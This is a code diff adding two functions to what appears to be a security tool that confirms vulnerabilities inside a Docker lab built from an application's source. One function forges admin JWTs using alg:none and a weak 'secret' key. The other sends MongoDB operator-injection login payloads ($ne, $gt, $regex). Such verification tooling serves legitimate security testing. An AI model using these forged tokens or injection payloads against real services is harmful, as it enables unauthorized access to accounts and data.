@@ -4324,3 +4324,207 @@ def verify_generic_prototype_pollution(
     finally:
         step("desmontando el laboratorio generico...")
         lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# JWT BYPASS verifier
+# ---------------------------------------------------------------------------
+
+def verify_generic_jwt_bypass(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "POST",
+    confirm_string: str = "",
+    weak_secret: str = "secret",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+) -> WpVerifyResult:
+    """Verifica JWT bypass via alg:none o clave debil.
+
+    Envia un JWT con algoritmo 'none' (sin firma) al endpoint de autenticacion.
+    Si el servidor acepta el token (status 200 o confirm_string en body) → CONFIRMED.
+    Tambien intenta JWT firmado con clave debil 'secret' como fallback.
+    """
+    import base64 as _b64
+    import json as _json
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
+                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        def _make_jwt_none(payload: dict) -> str:
+            header = _b64.urlsafe_b64encode(
+                _json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+            body_b64 = _b64.urlsafe_b64encode(
+                _json.dumps(payload).encode()).rstrip(b"=").decode()
+            return f"{header}.{body_b64}."
+
+        def _make_jwt_weak(payload: dict, secret: str = "secret") -> str:
+            import hmac
+            import hashlib
+            header = _b64.urlsafe_b64encode(
+                _json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+            body_b64 = _b64.urlsafe_b64encode(
+                _json.dumps(payload).encode()).rstrip(b"=").decode()
+            signing_input = f"{header}.{body_b64}".encode()
+            sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+            sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+            return f"{header}.{body_b64}.{sig_b64}"
+
+        token_id = _token()
+        payload_data = {"sub": f"admin-{token_id}", "role": "admin", "iat": 1700000000, "exp": 9999999999}
+
+        for label, jwt_token in [
+            ("alg:none bypass", _make_jwt_none(payload_data)),
+            (f"weak-secret ({weak_secret!r})", _make_jwt_weak(payload_data, weak_secret)),
+        ]:
+            step(f"JWT bypass: probando {label} contra {endpoint}")
+            hdrs = {"Authorization": f"Bearer {jwt_token}",
+                    "Content-Type": "application/json"}
+            st, _, body_bytes = _http_request(
+                base_url, endpoint, http_method,
+                headers=hdrs, timeout=15.0)
+            body = (body_bytes or b"").decode("utf-8", errors="replace")
+            step(f"  respuesta: status={st} len={len(body)}")
+            confirmed = False
+            if confirm_string and confirm_string in body:
+                confirmed = True
+            elif not confirm_string and st in (200, 201, 202, 204):
+                confirmed = True
+            if confirmed:
+                res.verified = True
+                res.ok = True
+                res.detail = (f"JWT BYPASS CONFIRMADO via {label}: status={st}, "
+                              f"endpoint={endpoint}")
+                step(f"VERIFICADO: JWT bypass via {label}")
+                _add_exploit_evidence(
+                    res=res, method=http_method, url=base_url + endpoint,
+                    resp_or_body=body,
+                    highlight=confirm_string or str(st),
+                    caption_es=(f"JWT BYPASS CONFIRMADO via {label}: token aceptado "
+                                f"por {endpoint} sin verificacion de firma valida."),
+                    caption_en=(f"JWT BYPASS CONFIRMED via {label}: token accepted "
+                                f"by {endpoint} without valid signature verification."),
+                )
+                return res
+        res.ok = True
+        res.detail = (f"JWT bypass no detectado: servidor rechazo tokens alg:none y "
+                      f"clave-debil en {endpoint}")
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_jwt_bypass: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico...")
+        lab.teardown()
+
+
+# ---------------------------------------------------------------------------
+# NoSQL Injection verifier (MongoDB $ne / $gt operator injection)
+# ---------------------------------------------------------------------------
+
+def verify_generic_nosql_injection(
+    source_dir: str,
+    endpoint: str,
+    http_method: str = "POST",
+    inject_param: str = "username",
+    confirm_string: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+) -> WpVerifyResult:
+    """Verifica NoSQL injection via operadores MongoDB ($ne, $gt, $regex).
+
+    Estrategia: enviar payload de operador MongoDB en campo de autenticacion.
+    Si la respuesta indica acceso concedido (confirm_string o status 200 en endpoint
+    que normalmente rechazaria credenciales invalidas) → CONFIRMED.
+    """
+    import json as _json
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
+                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        token_id = _token()
+        payloads = [
+            {inject_param: {"$ne": None}, "password": {"$ne": None}},
+            {inject_param: "admin", "password": {"$gt": ""}},
+            {inject_param: {"$regex": ".*"}, "password": {"$regex": ".*"}},
+            {inject_param: "admin'||'1'=='1", "password": "anything"},
+        ]
+        hdrs = {"Content-Type": "application/json"}
+
+        # Control request with invalid credentials to establish baseline
+        control_body = _json.dumps({inject_param: f"nosuchuser_{token_id}", "password": "wrongpwd_xyz"})
+        st_ctrl, _, b_ctrl = _http_request(
+            base_url, endpoint, http_method,
+            headers=hdrs, body=control_body.encode(), timeout=15.0)
+        body_ctrl = (b_ctrl or b"").decode("utf-8", errors="replace")
+        step(f"NoSQL baseline (invalid creds): status={st_ctrl} len={len(body_ctrl)}")
+
+        for i, payload in enumerate(payloads):
+            step(f"NoSQL injection: probando payload {i+1}/{len(payloads)}: "
+                 f"{_json.dumps(payload)[:80]}...")
+            body_data = _json.dumps(payload).encode()
+            st, _, body_bytes = _http_request(
+                base_url, endpoint, http_method,
+                headers=hdrs, body=body_data, timeout=15.0)
+            body = (body_bytes or b"").decode("utf-8", errors="replace")
+            step(f"  respuesta: status={st} len={len(body)}")
+
+            confirmed = False
+            if confirm_string and confirm_string in body:
+                confirmed = True
+            elif not confirm_string and st in (200, 201, 202) and st_ctrl not in (200, 201, 202):
+                confirmed = True
+            elif not confirm_string and len(body) > len(body_ctrl) + 50:
+                confirmed = True
+
+            if confirmed:
+                res.verified = True
+                res.ok = True
+                res.detail = (f"NOSQL INJECTION CONFIRMADA: payload {_json.dumps(payload)!r} "
+                              f"produjo respuesta diferente (status={st}) en {endpoint}")
+                step(f"VERIFICADO: NoSQL injection con payload {i+1}")
+                _add_exploit_evidence(
+                    res=res, method=http_method, url=base_url + endpoint,
+                    resp_or_body=body,
+                    highlight=confirm_string or body[:100],
+                    caption_es=(f"NOSQL INJECTION CONFIRMADA: operador MongoDB en "
+                                f"campo {inject_param!r} elude autenticacion."),
+                    caption_en=(f"NOSQL INJECTION CONFIRMED: MongoDB operator in "
+                                f"field {inject_param!r} bypasses authentication."),
+                )
+                return res
+
+        res.ok = True
+        res.detail = (f"NoSQL injection no detectada: {len(payloads)} payloads probados "
+                      f"en {endpoint}, sin diferencial claro")
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_nosql_injection: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico...")
+        lab.teardown()
